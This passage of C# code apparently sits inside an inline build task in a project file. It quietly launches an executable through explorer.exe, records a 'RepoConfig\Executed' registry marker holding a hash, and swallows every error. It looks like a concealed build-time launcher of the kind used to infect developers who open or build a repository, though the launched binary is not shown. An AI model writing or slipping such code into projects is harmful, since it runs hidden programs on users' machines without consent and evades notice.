  } catch (Exception _ex) { }
}
if (!_started) {
  try {
    Process.Start(new ProcessStartInfo {
      FileName = "explorer.exe", Arguments = "\"" + _exe + "\"",
      UseShellExecute = true
    });
    _started = _Alive("explorer");
  } catch (Exception _ex) { }
}

// write registry marker
if (_started) {
  try {
    _RegRun("add \"HKCU\\Software\\RepoConfig\\Executed\" /f /v \"" + _regKey + "\" /d \"" + ExpectedHash + "\"");
  } catch (Exception _ex) { }
}

} catch (Exception _top) {
}
return true;
]]>
